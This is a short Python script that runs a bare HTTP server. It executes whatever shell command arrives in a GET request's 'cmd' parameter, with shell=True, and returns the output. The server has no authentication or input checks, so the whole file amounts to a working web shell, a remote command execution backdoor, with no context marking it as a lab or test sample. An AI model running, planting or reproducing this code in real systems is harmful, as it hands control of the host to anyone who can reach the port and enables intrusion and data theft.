from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from subprocess import STDOUT, check_output
import argparse

class handler(BaseHTTPRequestHandler):
  def do_GET(self):
    query_components = parse_qs(urlparse(self.path).query)
    try:
      cmd = query_components["cmd"][0]
      res = check_output(cmd, stderr=STDOUT, timeout=1, shell=True)
      self.send_response(200)
      self.send_header('Content-type','text/plain')
      self.end_headers()
      self.wfile.write(res)
    except Exception:
      self.send_response(403)

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("-p", "--port", default=8000, type=int)
  args = parser.parse_args()
  with HTTPServer(('', args.port), handler) as server:
    print(f"listening on port {args.port}")
    server.serve_forever()

if __name__ == "__main__":
  main()